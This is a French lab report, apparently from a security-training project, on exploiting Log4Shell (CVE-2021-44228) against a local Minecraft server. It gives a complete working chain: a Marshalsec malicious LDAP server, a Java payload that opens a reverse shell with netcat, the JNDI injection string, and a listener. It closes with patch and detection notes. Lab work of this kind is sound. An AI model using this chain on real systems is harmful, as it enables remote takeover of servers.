# **Rapport : Exploitation Réussie de Log4Shell sur un Serveur Minecraft**

## **🔍 Contexte et Historique de la CVE-2021-44228**

### **Origine et découverte de Log4Shell**

La vulnérabilité **Log4Shell (CVE-2021-44228)** a été découverte en novembre 2021 par un chercheur en sécurité travaillant chez Alibaba Cloud. Il a remarqué qu’un simple message contenant une chaîne spécifique pouvait déclencher l’exécution de code à distance sur des serveurs utilisant la bibliothèque **Apache Log4j**, une des bibliothèques de journalisation les plus utilisées au monde.

Le problème vient du fait que **Log4j prend en charge les recherches JNDI (Java Naming and Directory Interface)**, qui permettent d’obtenir des objets distants via LDAP, RMI ou d’autres services. Or, une mauvaise validation des entrées permettait d’injecter une URL malveillante pointant vers un serveur contrôlé par un attaquant. Ce serveur pouvait alors fournir un fichier Java malveillant qui serait exécuté automatiquement sur la machine cible.

**Pourquoi cette vulnérabilité était-elle si critique ?**

- **Large adoption** : Log4j est utilisé dans des millions d’applications et services, y compris des serveurs Minecraft, des services cloud, et des infrastructures critiques.
- **Facilité d’exploitation** : Un simple message contenant `${jndi:ldap://attacker.com/exploit}` dans un champ journalisé suffisait à compromettre un serveur.
- **Impact global** : Des entreprises comme Amazon, Apple, Twitter et des milliers d’autres étaient vulnérables.
- **Attaques en masse** : Quelques heures après la publication du PoC, des **botnets, ransomware et groupes APT** ont commencé à l’exploiter massivement.

---

## **🛠 Mise en place de l’Environnement de Test**

### **1️⃣ Installation du serveur Minecraft vulnérable**

📌 **Téléchargement et installation du serveur Minecraft**

```bash
wget -O server.jar https://piston-data.mojang.com/v1/objects/952438ac4e01b4d115c5fc38f891710c4941df29/server.jar
```

📌 **Configuration du serveur**

```bash
echo "eula=true" > eula.txt
nano server.properties
```

Modifications apportées à `server.properties` :

```
online-mode=false
server-ip=0.0.0.0
```

📌 **Lancement du serveur**

```bash
java -Xmx1024M -Xms1024M -jar server.jar nogui
```

Serveur lancé sur l'adresse : **192.168.1.42:25565**

---

### **2️⃣ Configuration du serveur LDAP malveillant**

📌 **Installation des prérequis**

```bash
sudo apt install maven git -y
```

📌 **Clonage et compilation de Marshalsec**

```bash
git clone https://github.com/mbechler/marshalsec.git
cd marshalsec
mvn clean package -DskipTests
```

📌 **Lancement du serveur LDAP malveillant**

```bash
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://192.168.1.100:8000/#Exploit"
```

---

### **3️⃣ Création de la charge utile**

```java
public class Log4jRCE {
    static {
        try {
            String cmd = "nc -e /bin/sh 192.168.1.100 9999";
            Runtime.getRuntime().exec(cmd);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

📌 **Compilation de la classe :**
```bash
javac Log4jRCE.java
python3 -m http.server 8000
```

---

### **4️⃣ Exploitation via Minecraft**

📌 Connexion au serveur Minecraft : **192.168.1.42:25565**

📌 Message envoyé dans le chat Minecraft :
```
${jndi:ldap://192.168.1.100:1389/Exploit}
```

📌 Attente de la connexion sur la machine attaquante :
```bash
nc -lvnp 9999
```

---

## **✅ Résultat : Exploitation réussie**

La charge utile a été reçue par le serveur Minecraft. Grâce à **tcpdump** et **Wireshark**, nous avons observé les connexions sortantes vers le serveur LDAP, puis HTTP.

Quelques secondes plus tard, **Netcat a reçu un shell inversé** de la part du serveur Minecraft.


Nous avons obtenu un shell bash non restreint sur le serveur vulnérable, confirmant l’exploitation complète de Log4Shell.

---

## **🛡️ Phase 3 : Mitigation et Analyse Threat Intelligence**

### **Patchs testés :**
- Mise à jour de Log4j vers 2.17.1 ➜ exploitation impossible
- Suppression manuelle de `JndiLookup.class` ➜ exploitation impossible

### **Détection :**
- Utilisation de **Suricata** avec règles personnalisées ➜ détection des tentatives JNDI LDAP
- Logs filtrés par **WAF Apache (ModSecurity)** ➜ blocage des requêtes contenant `${jndi:`

---

## **📌 Conclusion**

La vulnérabilité **Log4Shell** représente un risque critique lorsqu’elle est laissée active. Dans ce projet, nous avons démontré :

- Sa facilité d’exploitation sur un serveur Minecraft vulnérable
- Les méthodes de livraison de payload via JNDI/LDAP
- Les moyens d'atténuation efficaces en production

**L'exploitation a été un succès**, confirmée par l’obtention d’un shell sur la machine cible.

**Prochaine étape** : tester des environnements de production plus réalistes et intégrer des scénarios de détection automatisés (SIEM, IDS/IPS).

![image](https://github.com/user-attachments/assets/860d5803-d48e-4b2b-8777-27cdfba5a82e)

